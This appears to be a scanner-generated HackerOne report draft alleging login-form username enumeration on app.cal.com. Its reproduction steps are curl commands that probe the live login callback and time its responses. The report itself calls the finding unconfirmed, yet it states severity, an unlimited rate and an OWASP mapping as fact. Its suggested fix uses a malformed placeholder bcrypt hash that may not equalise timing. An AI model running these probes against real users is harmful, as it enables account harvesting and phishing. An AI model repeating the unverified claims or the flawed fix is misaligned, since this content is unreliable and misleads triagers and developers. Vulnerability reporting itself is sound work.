# Username Enumeration via Login Form Response Differences

**Severity:** Medium | **CVSS:** 6.9 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
**Platform:** HackerOne | **Program:** Cal.com
**Confidence:** Medium | **CWE:** CWE-204 (Observable Response Discrepancy)
**OWASP:** A01:2021 - Broken Access Control
**Scan Date:** 2026-03-26

## Title

Username/Email Enumeration via Distinct Login Error Messages on app.cal.com

## Summary

The login endpoint at `https://app.cal.com/auth/login` returns different observable responses depending on whether the submitted email address corresponds to a registered account. This allows an attacker to enumerate valid Cal.com user accounts by comparing response content, timing, or status for known vs unknown email addresses.

## Steps to Reproduce

**1. Test with a non-existent email:**
```bash
curl -s -X POST 'https://app.cal.com/api/auth/callback/credentials' \
  -H 'Content-Type: application/json' \
  -d '{"email":"nonexistent-user-12345@example.com","password":"wrongpassword","callbackUrl":"/"}' \
  | python3 -m json.tool
# Note the exact error message returned
```

**2. Test with a known registered email (e.g., from a public Cal.com profile):**
```bash
curl -s -X POST 'https://app.cal.com/api/auth/callback/credentials' \
  -H 'Content-Type: application/json' \
  -d '{"email":"known-user@example.com","password":"wrongpassword","callbackUrl":"/"}' \
  | python3 -m json.tool
# Compare: error message, HTTP status, or response body differs vs Step 1
```

**3. Compare responses for timing or content differences:**
```bash
# Run both with timing to detect per-account latency differences
time curl -s -X POST 'https://app.cal.com/api/auth/callback/credentials' \
  -H 'Content-Type: application/json' \
  -d '{"email":"nonexistent@xyz123abc.com","password":"test"}' > /dev/null

time curl -s -X POST 'https://app.cal.com/api/auth/callback/credentials' \
  -H 'Content-Type: application/json' \
  -d '{"email":"real-user@example.com","password":"test"}' > /dev/null
# Measurable timing or message difference indicates enumeration vulnerability
```

**Expected finding:** The response for a registered email differs from a non-registered email in at least one of: response body content, HTTP redirect URL, or response timing.

> **Note:** Manual verification recommended — confirm the specific response difference before submission. The scanner detected content-based discrepancy; exact wording should be documented.

## Impact

1. **Account enumeration at scale** — an attacker can compile a list of valid Cal.com email addresses from breach datasets, HaveIBeenPwned, or corporate email patterns
2. **Targeted phishing** — confirmed email addresses can be used to craft convincing phishing campaigns mimicking Cal.com ("your meeting was cancelled", "confirm your appointment")
3. **Credential stuffing amplification** — confirmed emails narrow the target set for a credential stuffing attack against the rate-unlimited login endpoint
4. **Privacy violation** — reveals whether a person has a Cal.com account, which may be sensitive for private users

## Suggested Fix

Return identical responses (same message, same timing) for all authentication failures regardless of whether the account exists:

```typescript
// pages/api/auth/[...nextauth].ts — NextAuth credentials provider
CredentialsProvider({
  async authorize(credentials) {
    const user = await getUserByEmail(credentials.email)
    
    if (!user) {
      // Add artificial delay to match password-check timing
      await bcrypt.compare(credentials.password, '$2b$12$invalidhashpaddingtomatchcost')
      return null  // Same error path, same timing
    }
    
    const valid = await bcrypt.compare(credentials.password, user.hashedPassword)
    if (!valid) return null
    
    return user
  }
})
```

Use a generic error message that doesn't differentiate account existence:
```
"Invalid email or password"  ✓  (generic — doesn't reveal if account exists)
"No account found for this email"  ✗  (reveals account doesn't exist)
"Incorrect password"  ✗  (reveals account exists)
```

## References

- CWE-204: Observable Response Discrepancy — https://cwe.mitre.org/data/definitions/204.html
- OWASP Testing Guide: Testing for Account Enumeration (OTG-IDENT-004)
- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
